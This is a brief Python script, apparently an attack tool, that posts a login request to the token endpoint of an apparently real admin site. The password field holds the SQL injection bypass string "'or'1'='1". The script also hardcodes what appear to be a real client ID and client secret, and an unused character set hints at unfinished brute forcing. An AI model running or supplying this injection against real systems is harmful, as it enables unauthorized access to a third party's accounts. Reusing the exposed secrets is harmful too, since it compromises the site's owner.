import requests

str='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
strarr=[]
def addArray():
    
    pass

def attack():
    url='https://admin.cqzuxia.com/connect/token'
    data={
        'username': 'lic',
        'password': "'or'1'='1",
        'client_id': 'c12abe723eda4b66af77015f2b572440',
        'client_secret': 'yHpq/AII2pBeUrUlSeMZhEs84gxSfQ/y+PyGBOmI6dh33EK6Za1VwHwz7uRRifUC',
        'grant_type': 'password',
        'tenant_id': 32
    }
    res=requests.post(url,data=data)
    print(res.json())
    res.close()

if __name__ == '__main__':
    attack()

